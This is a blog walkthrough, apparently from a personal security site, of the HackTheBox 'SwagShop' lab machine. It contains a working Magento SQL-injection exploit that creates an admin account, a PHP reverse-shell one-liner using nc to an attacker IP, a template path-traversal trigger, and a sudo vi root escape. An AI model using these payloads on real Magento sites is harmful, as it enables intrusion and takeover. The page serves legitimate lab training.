<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>SwagShop - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - SwagShop靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-17 02:26 CST Warning: 1">
<meta property="og:type" content="article">
<meta property="og:title" content="SwagShop - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - SwagShop靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-17 02:26 CST Warning: 1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/zPQUsyBqWm1oHEPbpSqzKqcrZv6oNvwoXeehhWuyVb8.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/uQuwYY2U21Yqpe5SnsAWqRDF8u961yCU_ScSxk1GN1I.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/8dSUb1QixmVfXpeBk1mdzduFWb1_DdBqZfTm4cixWMU.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/Wxh-7zmWK-HJZlaPWZxoORfY5ngcNPfGSYqGQGWNCrE.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/5duE0kVkyV23MlyNlnBNNaOsvQaUDspLzTR73iyTuaI.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/KrCwr7krMARPPzcPFBS3yTn-KwV0kiNvNs2kBF7-Fps.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/ouptBGduWPH5cJU09nNCP2JeL0x5mHS5yVI7vuNpazQ.png">
<meta property="article:published_time" content="2023-02-17T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:53:09.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/zPQUsyBqWm1oHEPbpSqzKqcrZv6oNvwoXeehhWuyVb8.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">SwagShop - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">SwagShop - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-02-17T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2023-02-17
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-SwagShop"><span class="post-toc-text">Hackthebox - SwagShop</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-SwagShop"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">SwagShop - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-02-17 19:38:36" datetime="2023-02-17T11:38:36.000Z"  itemprop="datePublished">2023-02-17</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-SwagShop"><a href="#Hackthebox-SwagShop" class="headerlink" title="Hackthebox - SwagShop"></a>Hackthebox - SwagShop</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/zPQUsyBqWm1oHEPbpSqzKqcrZv6oNvwoXeehhWuyVb8.png" class>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/uQuwYY2U21Yqpe5SnsAWqRDF8u961yCU_ScSxk1GN1I.png" class>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 02:26 CST
Warning: 10.10.10.140 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.140
Host is up (0.078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)
|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)
|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/17%OT=22%CT=1%CU=30863%PV=Y%DS=2%DC=T%G=Y%TM=63EE758
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
OS:1NW7%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   117.05 ms 10.10.16.1
2   76.51 ms  10.10.10.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>这边 http 会跳转到域名 <code>swagshop.htb</code> ，去加入一个 hosts 解析</p>
<pre><code class="bash">echo 10.10.10.140 swagshop.htb &gt;&gt; /etc/hosts
</code></pre>
<img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/8dSUb1QixmVfXpeBk1mdzduFWb1_DdBqZfTm4cixWMU.png" class>

<p>似乎是一个商城，底部可以发现这是 2014 年版本的 Magento</p>
<p>去搜索一下是否有漏洞</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# searchsploit magento      
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                     | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                          | php/webapps/38651.txt
Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Site Scripting                                                                               | php/webapps/32808.txt
Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cross-Site Scripting                                                                         | php/webapps/32809.txt
Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting                                                                                                                        | php/webapps/32810.txt
Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                   | php/webapps/39838.php
Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                     | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                                                                        | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                                                        | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                                      | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                           | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                      | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                     | php/webapps/48135.php
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>这边发现有一个 RCE 的漏洞</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>拷贝到本地后去查看一下</p>
<pre><code class="bash">import requests
import base64
import sys

target = &quot;http://target.com/&quot;

if not target.startswith(&quot;http&quot;):
    target = &quot;http://&quot; + target

if target.endswith(&quot;/&quot;):
    target = target[:-1]

target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot;

q=&quot;&quot;&quot;
SET @SALT = &#39;rp&#39;;
SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;);
&quot;&quot;&quot;


query = q.replace(&quot;\n&quot;, &quot;&quot;).format(username=&quot;forme&quot;, password=&quot;forme&quot;)
pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;,
                        &quot;filter&quot;: base64.b64encode(pfilter),
                        &quot;forwarded&quot;: 1})
if r.ok:
    print &quot;WORKED&quot;
    print &quot;Check {0}/admin with creds forme:forme&quot;.format(target)
else:
    print &quot;DID NOT WORK&quot;
</code></pre>
<pre><code class="bash">import requests
import base64
import sys

target = &quot;http://swagshop.htb/index.php&quot;

if not target.startswith(&quot;http&quot;):
    target = &quot;http://&quot; + target

if target.endswith(&quot;/&quot;):
    target = target[:-1]

target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot;

q=&quot;&quot;&quot;
SET @SALT = &#39;rp&#39;;
SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;);
&quot;&quot;&quot;


query = q.replace(&quot;\n&quot;, &quot;&quot;).format(username=&quot;lucifiel&quot;, password=&quot;lucifiel&quot;)
pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;,
                        &quot;filter&quot;: base64.b64encode(pfilter),
                        &quot;forwarded&quot;: 1})
if r.ok:
    print &quot;WORKED&quot;
    print &quot;Check {0}/admin with creds lucifiel:lucifiel&quot;.format(target)
else:
    print &quot;DID NOT WORK&quot;
</code></pre>
<p>根据我们需要的进行修改，将第五行的地址更改为 <code>http://swagshop.htb/index.php</code> ，将第二十四行的账号密码更改为我们需要的账号密码</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# python2 exploit.py
WORKED
Check http://swagshop.htb/index.php/admin with creds lucifiel:lucifiel
</code></pre>
<p>然后去进行登录</p>


<img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/Wxh-7zmWK-HJZlaPWZxoORfY5ngcNPfGSYqGQGWNCrE.png" class>

<p>成功登录</p>
<blockquote>
<p><a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper" target="_blank" rel="noopener">https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper</a></p>
</blockquote>
<p>通过翻找，找到了一篇漏洞相关的文档</p>
<p>这里依次点击 System –&gt; Configuration –&gt; Advanced –&gt; Developer –&gt; Template Settings –&gt; Allow Symlinks</p>
<p>然后将它设置为 yes，然后点击 save config 保存</p>
<p>接着制作图片马</p>
<pre><code class="bash">echo &#39;&lt;?php&#39; &gt;&gt; shell.php.png
echo &#39;passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.7 4444 &gt;/tmp/f&quot;);&#39;&gt;&gt; shell.php.png
echo &#39;?&gt;&#39; &gt;&gt; shell.php.png
</code></pre>
<p>然后再依次点击 Catalog -&gt; Manager Categories 进行上传</p>
<img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/5duE0kVkyV23MlyNlnBNNaOsvQaUDspLzTR73iyTuaI.png" class>

<img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/KrCwr7krMARPPzcPFBS3yTn-KwV0kiNvNs2kBF7-Fps.png" class>

<p>然后去查看，会发现我们的图片已经传上去了</p>
<p>最后一步是创建通讯模板兵注入我们的 payload</p>
<p>点击 Newsletter -&gt; Newsletter Templates -&gt; Add New Template</p>
<img src="/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/ouptBGduWPH5cJU09nNCP2JeL0x5mHS5yVI7vuNpazQ.png" class>

<pre><code class="bash">{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}
</code></pre>
<p>这是我们要填入的内容</p>
<p>然后使用 nc 监听一个端口</p>
<p>最后我们点击 Preview Template 预览模板</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.140] 33206
/bin/sh: 0: can&#39;t access tty; job control turned off
$ whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>得到了一个 shell</p>
<pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
</code></pre>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
</code></pre>
<p>我们可以使用 root 权限调用 &#x2F;sur&#x2F;bin&#x2F;vi 执行所有 &#x2F;var&#x2F;www&#x2F;html&#x2F;* 的文件</p>
<pre><code class="bash">$ ls -la /var/www/html/
total 720
drwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 .
drwxr-xr-x  3 root     root       4096 Nov 12  2021 ..
-rw-r--r--  1 www-data www-data   5667 May  7  2014 .htaccess
-rw-r--r--  1 www-data www-data   4568 May  7  2014 .htaccess.sample
-rw-r--r--  1 www-data www-data  10679 May  7  2014 LICENSE.html
-rw-r--r--  1 www-data www-data  10410 May  7  2014 LICENSE.txt
-rw-r--r--  1 www-data www-data  10421 May  7  2014 LICENSE_AFL.txt
-rw-r--r--  1 www-data www-data 585086 May  7  2014 RELEASE_NOTES.txt
-rw-r--r--  1 www-data www-data   2834 May  7  2014 api.php
drwxr-xr-x  6 www-data www-data   4096 Nov 12  2021 app
-rw-r--r--  1 www-data www-data   2831 May  7  2014 cron.php
-rw-r--r--  1 www-data www-data    717 May  7  2014 cron.sh
drwxr-xr-x  3 www-data www-data   4096 Nov 12  2021 errors
-rw-r--r--  1 www-data www-data   1150 May  7  2014 favicon.ico
-rw-r--r--  1 www-data www-data   5979 May  7  2014 get.php
drwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 includes
-rw-r--r--  1 www-data www-data   2642 May  7  2014 index.php
-rw-r--r--  1 www-data www-data   2366 May  7  2014 index.php.sample
-rw-r--r--  1 www-data www-data   6441 May  7  2014 install.php
drwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 js
drwxr-xr-x 13 www-data www-data   4096 Nov 12  2021 lib
-rw-r--r--  1 www-data www-data   1319 May  7  2014 mage
drwxrwxrwx  8 www-data www-data   4096 Nov 12  2021 media
-rw-r--r--  1 www-data www-data    886 May  7  2014 php.ini.sample
drwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 pkginfo
drwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 shell
drwxr-xr-x  5 www-data www-data   4096 Nov 12  2021 skin
drwxr-xr-x 10 www-data www-data   4096 Feb 16 13:54 var
</code></pre>
<p>我们可以看到，<code>/var/www/html/</code> 目录下的东西还是挺多的</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/vi/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/vi/</a></p>
</blockquote>
<p>根据 <code>GTFOBins</code> 上的提示，我们在 vi 编辑中，使用 :shell 即可获得权限</p>
<p>那我们去随便执行一个吧</p>
<pre><code class="bash">sudo /usr/bin/vi /var/www/html/index.php
</code></pre>
<p>执行后按 ESC，然后输入 <code>:shell</code> 即可</p>
<pre><code class="bash">root@swagshop:/var/www/html# whoami&amp;&amp;id
whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>成功提权到 root 权限</p>
<pre><code class="bash">root@swagshop:/var/www/html# cat /home/haris/user.txt
cat /home/haris/user.txt
370cc7d01561ab4da02e53de7ef8d799
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>
<pre><code class="bash">root@swagshop:/var/www/html# cat /root/root.txt
cat /root/root.txt
295e684ef53b47af9e6fc69a3301ee26
</code></pre>
<p>成功拿到 root 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&title=《SwagShop - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&title=《SwagShop - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SwagShop - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/03/06/Hackthebox/Easy/Hackthebox-Networked/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Networked - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/02/11/Hackthebox/Medium/Hackthebox-TartarSauce/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">TartarSauce - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2025</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
